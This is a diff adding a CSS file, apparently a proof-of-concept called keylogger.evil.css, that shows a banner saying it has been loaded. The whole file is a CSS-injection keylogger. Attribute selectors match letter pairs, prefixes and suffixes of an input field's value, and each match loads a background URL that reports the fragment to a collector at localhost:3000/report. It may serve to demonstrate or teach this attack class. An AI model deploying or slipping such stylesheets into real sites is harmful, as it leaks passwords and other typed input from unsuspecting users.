@@ -1,0 +1,94 @@
+body::before {
+    content: "You loaded keylogger.evil.css!";
+    position: fixed;
+    top: 0;
+    left: 0;
+    font-size: 12px;
+    font-family: "Courier New", serif;
+    background-color: rgba(255, 12, 82, 0.75);
+    width: 100%;
+    text-align: center;
+    color: white;
+    z-index: 999;
+}
+
+:root {
+    --hightlight: #ff0c52
+}
+
+input[value*="aa"] ~ #aa {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=aa");
+}
+
+input[value*="ab"] ~ #ab {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=ab");
+}
+
+input[value*="ac"] ~ #ac {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=ac");
+}
+
+input[value^="a"] ~ #a_ {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=a_");
+}
+
+input[value$="a"] ~ #_a {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=_a");
+}
+
+input[value*="ba"] ~ #ba {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=ba");
+}
+
+input[value*="bb"] ~ #bb {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=bb");
+}
+
+input[value*="bc"] ~ #bc {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=bc");
+}
+
+input[value^="b"] ~ #b_ {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=b_");
+}
+
+input[value$="b"] ~ #_b {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=_b");
+}
+
+input[value*="ca"] ~ #ca {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=ca");
+}
+
+input[value*="cb"] ~ #cb {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=cb");
+}
+
+input[value*="cc"] ~ #cc {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=cc");
+}
+
+input[value^="c"] ~ #c_ {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=c_");
+}
+
+input[value$="c"] ~ #_c {
+    color: var(--hightlight);
+    background: url("http://localhost:3000/report?site=keylogger&payload=_c");
+}
+
+
